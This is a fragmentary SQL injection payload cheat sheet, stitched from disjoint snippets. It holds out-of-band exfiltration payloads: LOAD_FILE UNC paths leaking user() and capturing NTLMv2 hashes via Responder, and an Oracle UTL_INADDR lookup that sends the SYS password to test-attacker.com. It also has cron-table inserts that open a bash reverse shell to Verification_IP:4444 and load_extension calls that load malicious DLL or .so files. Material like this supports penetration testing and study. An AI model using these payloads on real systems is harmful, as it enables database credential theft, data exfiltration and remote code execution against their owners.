...
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.test-attacker.com\\share'));
-- Triggers SMB connection → DNS lookup with data in hostname

-- More complete:
SELECT LOAD_FILE(CONCAT('\\\\Verification_IP\\', user(), '\\l.txt'));
-- SMB authentication attempt → Verification_IP captures NTLMv2 hash via Responder
```
...
-- Note(do not run it against real data): a boolean payload (e.g. 1' OR '1'='1) would match every row (DoS / data destruction) — do not run it against real data.
```
...
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.test-attacker.com')--
```
...
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/Verification_IP/4444 0>&1"');
```
...
SELECT load_extension('\\Verification_IP\share\evil.dll')
```
...
CREATE TABLE pwn.exp (payload TEXT);
INSERT INTO pwn.exp VALUES ('* * * * * bash -i >& /dev/tcp/Verification_IP/4444 0>&1');

-- RCE via load_extension
-- Compile shared library with init function, then:
SELECT load_extension('/tmp/evil.so','init_func');
-- Windows UNC: SELECT load_extension('\\Verification_IP\share\evil.dll');
